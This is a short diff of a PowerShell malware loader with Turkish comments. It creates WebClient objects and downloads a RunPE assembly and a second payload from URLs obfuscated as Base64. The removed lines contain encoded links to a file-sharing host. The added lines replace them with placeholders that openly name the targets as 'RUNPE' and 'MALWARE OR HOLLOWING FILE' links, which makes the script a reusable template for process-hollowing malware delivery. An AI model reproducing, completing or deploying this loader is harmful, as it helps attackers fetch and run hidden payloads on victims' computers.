@@ -9,13 +9,13 @@ function Main {
     $webClient = New-Object System.Net.WebClient
 
     # Base64 ile kodlanmış assembly metnini çöz ve indir
-    $rawAssembly = $webClient.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zMjYuZmlsZXRyYW5zZmVyLmlvL3N0b3JhZ2UvZG93bmxvYWQva3NLdjFSSW8xVnFa")))
+    $rawAssembly = $webClient.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RUNPE DIRECT LINK")))
 
     # İkinci WebClient nesnesi oluştur
     $webClient2 = New-Object System.Net.WebClient
 
     # İkinci base64 kodlanmış dosya metnini çöz ve URL'ye dönüştür
-    $fileLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zMjUuZmlsZXRyYW5zZmVyLmlvL3N0b3JhZ2UvZG93bmxvYWQvZzVWMkoxSUYySVRV"))
+    $fileLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MALWARE OR HOLLOWING FILE DIRECT LINK"))
     $address = New-Object System.Uri($fileLink)
 
     # Dosyayı indir
